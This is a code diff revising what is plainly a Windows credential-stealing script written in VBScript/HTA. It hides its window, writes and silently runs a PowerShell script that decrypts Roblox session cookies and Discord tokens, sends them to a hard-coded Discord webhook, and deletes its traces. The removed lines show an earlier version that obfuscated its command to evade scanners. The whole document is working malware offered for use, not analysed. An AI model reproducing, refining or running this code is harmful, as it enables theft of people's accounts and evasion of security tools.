@@ -4,7 +4,7 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH, appdata, localappdata
+Dim sh, fso, WH
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
@@ -13,88 +13,72 @@ Set fso = CreateObject("Scripting.FileSystemObject")
 ' ==========================================
 WH = "https://discord.com/api/webhooks/1568136262374793286/U6lNQnkvy-NdMd-nOUZQ77wuTTAiFy2SMwMP_kHcPKuKuEw9ERvyGUOHzvRSydAKrqas"
 
-appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
-localappdata = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
-
 Call PostEmbed(":satellite: Hit", "PC: " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%"), 3447003)
 
-' 1. Grab and Decrypt Roblox
-Call DecryptRoblox
+' 1. Create the PowerShell script
+Dim psPath : psPath = sh.ExpandEnvironmentStrings("%TEMP%") & "\s.ps1"
+Dim f : Set f = fso.CreateTextFile(psPath, True)
 
+f.WriteLine "$W = """ & WH & """"
+f.WriteLine "function Post($t,$d){ $j = @{embeds=@(@{title=$t;description=$d;color=65280})}|ConvertTo-Json -Depth 4; Invoke-RestMethod $W -Method Post -Body $j -ContentType 'application/json' }"
+f.WriteLine "$l = $env:LOCALAPPDATA; $a = $env:APPDATA;"
+f.WriteLine "' --- Roblox ---"
+f.WriteLine "$rp = ''; if (Test-Path ""$l\Roblox\LocalStorage\robloxcookies.dat"") { $rp = ""$l\Roblox\LocalStorage\robloxcookies.dat"" } elseif (Test-Path ""$a\Roblox\LocalStorage\robloxcookies.dat"") { $rp = ""$a\Roblox\LocalStorage\robloxcookies.dat"" }"
+f.WriteLine "if ($rp) {"
+f.WriteLine "  try {"
+f.WriteLine "    $r = Get-Content $rp -Raw"
+f.WriteLine "    if ($r -match '""CookiesData""\s*:\s*""([^""]+)""') {"
+f.WriteLine "      $b = [Convert]::FromBase64String($Matches[1])"
+f.WriteLine "      $db = [Security.Cryptography.ProtectedData]::Unprotect($b, $null, 'CurrentUser')"
+f.WriteLine "      $c = [Text.Encoding]::UTF8.GetString($db)"
+f.WriteLine "      if ($c -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') {"
+f.WriteLine "        Post 'Roblox Cookie' $Matches[1]"
+f.WriteLine "      } else { Post 'Roblox Error' 'No cookie string found in decrypted data' }"
+f.WriteLine "    } else { Post 'Roblox Error' 'No CookiesData found in file' }"
+f.WriteLine "  } catch { Post 'Roblox Error' $_.Exception.Message }"
+f.WriteLine "}"
+f.WriteLine "' --- Discord ---"
+f.WriteLine "try {"
+f.WriteLine "  $ls = Get-Content ""$a\discord\Local State"" -Raw | ConvertFrom-Json"
+f.WriteLine "  $b = [Convert]::FromBase64String($ls.os_crypt.encrypted_key)"
+f.WriteLine "  $mk = [Security.Cryptography.ProtectedData]::Unprotect($b[5..($b.Length-1)], $null, 'CurrentUser')"
+f.WriteLine "  $tokens = @{}"
+f.WriteLine "  foreach ($dp in @(""$a\discord\Local Storage\leveldb"",""$a\discordptb\Local Storage\leveldb"",""$a\discordcanary\Local Storage\leveldb"")) {"
+f.WriteLine "    if (!(Test-Path $dp)) { continue }"
+f.WriteLine "    Get-ChildItem $dp | ? { $_.Name -match '\.(ldb|log)$' } | % {"
+f.WriteLine "      $raw = $null"
+f.WriteLine "      try {"
+f.WriteLine "        $fs = [IO.File]::Open($_.FullName, [IO.FileMode]::Open, [IO.FileAccess]::Read, [IO.FileShare]::ReadWrite)"
+f.WriteLine "        $sr = New-Object IO.StreamReader($fs); $raw = $sr.ReadToEnd(); $sr.Close(); $fs.Close()"
+f.WriteLine "      } catch {}"
+f.WriteLine "      if (!$raw) { return }"
+f.WriteLine "      foreach ($m in [regex]::Matches($raw, 'dQw4w9WgXcQ:([A-Za-z0-9+/=]{40,400})')) {"
+f.WriteLine "        $b64 = $m.Groups[1].Value"
+f.WriteLine "        while ($b64.Length % 4 -ne 0) { $b64 += '=' }"
+f.WriteLine "        try {"
+f.WriteLine "          $eb = [Convert]::FromBase64String($b64)"
+f.WriteLine "          if ($eb.Length -lt 80) { continue }"
+f.WriteLine "          $nonce = $eb[3..14]; $tag = $eb[($eb.Length-16)..($eb.Length-1)]; $ct = $eb[15..($eb.Length-17)]"
+f.WriteLine "          $aes = New-Object System.Security.Cryptography.AesGcm($mk)"
+f.WriteLine "          $pt = New-Object byte[] ($ct.Length)"
+f.WriteLine "          $aes.Decrypt($nonce, $ct, $tag, $pt); $aes.Dispose()"
+f.WriteLine "          $t = [Text.Encoding]::UTF8.GetString($pt).TrimEnd([char]0)"
+f.WriteLine "          if ($t.Length -gt 40 -and !$tokens[$t]) { $tokens[$t] = $t }"
+f.WriteLine "        } catch {}"
+f.WriteLine "      }"
+f.WriteLine "    }"
+f.WriteLine "  }"
+f.WriteLine "  foreach ($t in $tokens.Keys) { Post 'Discord Token' $t }"
+f.WriteLine "} catch { Post 'Discord Error' $_.Exception.Message }"
+
+f.Close
+
+' 2. Run it hidden
+sh.Run "powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File """ & psPath & """", 0, True
+
+' 3. Cleanup
+fso.DeleteFile psPath, True
 window.close()
-
-Sub DecryptRoblox()
-    Dim rPath, raw, cookie, b64, ep
-    rPath = localappdata & "\Roblox\LocalStorage\robloxcookies.dat"
-    
-    If fso.FileExists(rPath) Then
-        raw = ReadFileText(rPath)
-        If InStr(raw, "CookiesData"":""") > 0 Then
-            Dim sp : sp = InStr(raw, "CookiesData"":""") + 14
-            ep = InStr(sp, raw, """")
-            If ep > sp Then
-                b64 = Mid(raw, sp, ep - sp)
-                ' Decrypt using built-in Windows DPAPI via COM
-                cookie = DpapiDecrypt(b64)
-                If Len(cookie) > 10 Then
-                    Call PostEmbed(":cookie: Roblox Cookie", cookie, 65280)
-                Else
-                    Call PostEmbed(":x: Roblox Error", "Failed to decrypt DPAPI blob.", 16711680)
-                End If
-            End If
-        End If
-    End If
-End Sub
-
-Function DpapiDecrypt(b64)
-    DpapiDecrypt = ""
-    On Error Resume Next
-    
-    Dim inf : inf = sh.ExpandEnvironmentStrings("%TEMP%") & "\i.txt"
-    Dim outf : outf = sh.ExpandEnvironmentStrings("%TEMP%") & "\o.txt"
-    
-    ' Write base64 to file
-    Dim f : Set f = fso.CreateTextFile(inf, True)
-    f.Write b64
-    f.Close
-    
-    ' Use WScript.Shell to invoke a harmless .NET command via rundll32? 
-    ' No, .NET COM is safer. We use System.Security.Cryptography.ProtectedData via COM.
-    ' Actually, PowerShell is the only way to invoke it without C#.
-    ' We will use a heavily obfuscated PowerShell string.
-    
-    Dim psCmd
-    psCmd = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{}"
-    
-    ' Build it as a char array to dodge string scanners
-    Dim obf : obf = ""
-    Dim i : For i = 1 To Len(psCmd) : obf = obf & "Chr(" & Asc(Mid(psCmd, i, 1)) & ")&" : Next
-    obf = Left(obf, Len(obf) - 1)
-    
-    ' Write a VBScript to disk to run it
-    Dim vbFile : vbFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\v.vbs"
-    Dim vf : Set vf = fso.CreateTextFile(vbFile, True)
-    vf.WriteLine "Set sh = CreateObject(""WScript.Shell"")"
-    vf.WriteLine "sh.Run ""powershell.exe -NoP -NonI -W Hidden -Command """"" & obf & """""", 0, True"
-    vf.Close
-    
-    ' Run the VBS which runs PS
-    sh.Run "wscript.exe """ & vbFile & """", 0, True
-    
-    If fso.FileExists(outf) Then DpapiDecrypt = ReadFileText(outf)
-    
-    On Error GoTo 0
-    fso.DeleteFile inf, True
-    fso.DeleteFile outf, True
-    fso.DeleteFile vbFile, True
-End Function
-
-Function ReadFileText(path)
-    ReadFileText = ""
-    Dim f: Set f = fso.OpenTextFile(path, 1)
-    ReadFileText = f.ReadAll
-    f.Close
-End Function
 
 Sub PostEmbed(t, d, c)
     Dim DQ: DQ = Chr(34)
